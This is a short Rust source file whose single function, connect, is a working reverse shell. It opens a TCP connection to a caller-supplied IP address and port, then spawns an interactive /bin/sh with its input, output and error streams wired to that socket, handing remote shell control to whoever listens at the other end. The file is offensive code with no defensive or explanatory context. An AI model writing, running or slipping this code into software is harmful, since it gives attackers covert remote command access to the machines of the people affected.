use std::net::{TcpStream};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn connect(ip: String, port: String){
    let socket = [ip, port].join(":");
    let s = TcpStream::connect(socket).unwrap();
    let fd = s.as_raw_fd();

    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}


